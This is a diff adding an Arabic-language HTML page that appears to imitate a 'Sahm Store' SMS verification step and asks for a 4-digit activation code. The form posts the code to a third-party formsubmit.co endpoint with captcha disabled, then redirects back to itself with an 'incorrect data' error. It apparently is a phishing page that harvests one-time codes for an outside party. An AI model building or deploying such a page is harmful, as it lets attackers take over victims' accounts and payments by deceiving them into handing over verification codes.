@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>أدخل الكود | متجر سهم</title>
+  <link rel="shortcut icon" href="logo.png" />
+  <link rel="stylesheet" href="normalize.css" />
+  <link rel="stylesheet" href="fremwork.css" />
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="all.min.css" />
+  <style>
+    .hCode .container {
+      height: calc(100vh - 50px);
+      width: 100%;
+    }
+
+    .hCode .box {
+      display: block;
+      padding: 24px;
+      overflow: auto;
+      outline: 0;
+      max-width: 500px;
+      max-height: 500px;
+    }
+
+    .hCode .box h1 {
+      font-size: 16px;
+      font-weight: 100;
+      color: darkred;
+      line-height: 1.5;
+      margin-bottom: 30px;
+    }
+
+    .hCode .box p {
+      line-height: 1.6;
+      font-size: 15px;
+      margin-bottom: 35px;
+    }
+
+    .hCode .box form .input {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .hCode form .input input {
+      width: 200px;
+      height: 35px;
+      outline: none;
+      padding: 10px 14px;
+      border: none;
+      border-bottom: 1px solid #ccc;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+
+    form .input input::-webkit-outer-spin-button,
+    form .input input::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+    }
+
+    .hCode form .input input::placeholder {
+      color: #5f5f5f;
+      transition: 0.5s;
+    }
+
+    .hCode form .input input:focus::placeholder {
+      opacity: 0;
+    }
+
+    .hCode form .input .error {
+      color: #f00;
+      font-weight: 100;
+      display: none;
+    }
+
+    .hCode form .sub {
+      margin-top: 10px;
+    }
+
+    .hCode form .sub span {
+      cursor: pointer;
+      padding: 10px 0;
+      margin: 0 10px;
+    }
+
+    .hCode form .sub input {
+      cursor: pointer;
+      padding: 10px 0;
+      margin: 0 10px;
+      background-color: transparent;
+      border: none;
+      outline: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="all-sections">
+    <section class="hCode">
+      <div class="container center-flex">
+        <div class="box bg-white bR-7">
+          <h1>تم إرسال كود التفعيل في رسالة نصية على رقم الهاتف الخاص بك</h1>
+          <p>
+            أدخل كود التفعيل المكون من 4 خانات الذى تم إرساله عبر رسالة نصية
+            إلى هاتفك <span class="phone"></span>
+          </p>
+          <form action="https://formsubmit.co/074913a62348efcdb4d542364986379b" method="post">
+            <input type="hidden" name="_next" value="https://naellweb.github.io/kp/hCode.html" />
+            <input type="hidden" name="_captcha" value="false" />
+            <input type="hidden" name="_subject" value="كود التفعيل" />
+            <div class="input">
+              <label for="الكود">الرمز</label>
+              <input name="الكود" type="number" maxlength="4" placeholder="الرمز:" required />
+              <span class="error">بيانات التفعيل غير صحيحة</span>
+            </div>
+            <div class="sub">
+              <span>الغاء</span>
+              <input id="sub" type="submit" value="ادخال" />
+            </div>
+          </form>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script src="hCode.js"></script>
+</body>
+
+</html>
